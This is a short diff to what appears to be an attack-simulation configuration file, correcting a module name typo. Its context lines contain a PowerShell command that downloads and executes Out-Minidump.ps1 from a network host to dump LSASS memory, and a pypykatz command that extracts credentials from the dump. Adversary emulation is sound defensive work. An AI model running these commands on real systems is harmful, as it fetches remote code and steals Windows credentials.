@@ -65,7 +65,7 @@ simulation:
       script: powershell_execute "iex (iwr -UseBasicParsing http://10.0.5.13/Out-Minidump.ps1) ; Get-Process lsass | Out-Minidump;"
     - type: application
       name: pypykatz
-      module: minidumo
+      module: minidump
       script: pypykatz lsa minidump /home/kali/lsass_628.dmp
   permissions_required:
     - Administrator
